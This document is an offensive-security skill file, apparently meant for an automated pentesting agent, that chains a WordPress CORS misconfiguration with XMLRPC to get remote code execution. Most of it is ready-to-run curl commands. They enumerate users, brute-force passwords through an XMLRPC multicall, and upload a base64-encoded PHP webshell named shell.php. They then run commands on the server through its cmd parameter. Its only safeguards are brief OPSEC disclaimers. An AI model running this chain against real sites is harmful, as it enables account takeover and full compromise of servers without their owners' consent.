---
name: cors-xmlrpc-rce
description: Chain CORS misconfig + XMLRPC brute force → RCE via webshell upload
version: 1.0.0
phase: chains
category: chaining
tags: [cors, xmlrpc, brute-force, rce, wordpress, webshell]
tools: [curl, wpscan]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - hunt-cors-misconfiguration
  - xmlrpc-exploitation
  - webshell-deploy
mitre_attack:
  - T1110.003
  - T1505.003
  - T1190
---

## When to Use

Use this skill when a WordPress site has both a CORS misconfiguration and
XMLRPC enabled. Chain CORS credential theft → user enumeration → XMLRPC
brute force → wp.uploadFile webshell upload for full RCE.

## Prerequisites

- curl
- WordPress target with XMLRPC enabled
- CORS misconfiguration confirmed (reflects Origin)
- Valid or brute-forced WordPress credentials

## Procedure

```bash
# STEP 1: Confirm CORS misconfiguration reflects Origin
curl -sk -D- -H "Origin: https://attacker.com" "https://TARGET/wp-json/" 2>/dev/null | grep -i "access-control-allow-origin"

# STEP 2: Enumerate WordPress users via REST API
curl -sk "https://TARGET/wp-json/wp/v2/users" | jq -r '.[].slug'

# STEP 3: Confirm XMLRPC is enabled
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' | grep "wp.getUsersBlogs"

# STEP 4: Brute force WordPress credentials via XMLRPC multicall
curl -sk -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>password123</string></value></data></array></value></member></struct></value></param></params></methodCall>'

# STEP 5: Use valid credentials to upload webshell via wp.uploadFile
# First, get the auth cookie:
curl -sk -c /tmp/wp-cookies.txt -X POST "https://TARGET/wp-login.php" \
  -d "log=admin&pwd=password123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"

# STEP 6: Upload PHP webshell via XMLRPC wp.uploadFile
curl -sk -b /tmp/wp-cookies.txt -X POST "https://TARGET/xmlrpc.php" \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.uploadFile</methodName><params><param><value><int>1</int></value></param><param><value><struct><member><name>name</name><value><string>shell.php</string></value></member><member><name>type</name><value><string>application/x-php</string></value></member><member><name>bits</name><value><base64>PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</base64></value></member></struct></value></param></params></methodCall>'

# STEP 7: Verify webshell execution
curl -sk "https://TARGET/wp-content/uploads/shell.php?cmd=id"
```

## OPSEC Rules

- **CRITICAL**: This chain combines multiple attack stages — document each step
- Limit brute force attempts (max 100 per user)
- Remove webshell immediately after verification
- Do not use for unauthorized access
- Log all XMLRPC calls for audit trail

## Verification

- Confirm CORS reflects attacker origin
- Verify XMLRPC accepts multicall brute force
- Test wp.uploadFile succeeds with stolen credentials
- Confirm webshell executes commands on server

## Pitfalls

- XMLRPC may be disabled or rate-limited
- WordPress may have file upload restrictions (MIME type checks)
- Webshell may be quarantined by security plugins
- CORS may require specific headers to trigger
- Account lockout may prevent brute force

## Output Format

```
[CHAIN] CORS → XMLRPC → RCE chain successful
  Step 1: CORS misconfiguration confirmed (reflects Origin)
  Step 2: User enumerated: admin
  Step 3: XMLRPC brute force successful (admin:password123)
  Step 4: Webshell uploaded via wp.uploadFile
  Step 5: RCE confirmed (www-data)
  Severity: CRITICAL (9.0)
```
